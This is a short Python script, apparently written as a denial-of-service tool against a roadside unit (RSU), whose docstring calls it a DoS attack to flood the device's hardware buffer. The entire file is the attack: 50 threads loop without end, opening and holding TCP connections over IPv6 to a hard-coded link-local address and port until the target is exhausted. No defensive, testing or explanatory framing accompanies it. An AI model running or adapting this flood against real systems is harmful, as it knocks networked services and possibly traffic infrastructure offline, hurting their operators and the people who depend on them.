#! /usr/bin/env python3
'''
To DoS Atack: flood h/w bufer for RSU form RSPC

Prakhar Gupta
'''

import socket
import time
import threading

TARGET_IP = 'fe80::6e5:48ff:fe30:0820'  # RSU IP address (modify as necessary)
TARGET_PORT = 7002           # Replace with the target port
NUM_CONNECTIONS = 10000      # Adjust this to stress the server

sockets = []

def flood_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT, 0, 2))  # IPv6 scope ID may need adjustment
            sockets.append(s)
            print(f"Opened connection: {len(sockets)}")
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(0.1)  # Slight delay to avoid instant crash

# Launch multiple threads to increase the attack intensity
threads = []
for _ in range(50):  # Number of threads
    t = threading.Thread(target=flood_server)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
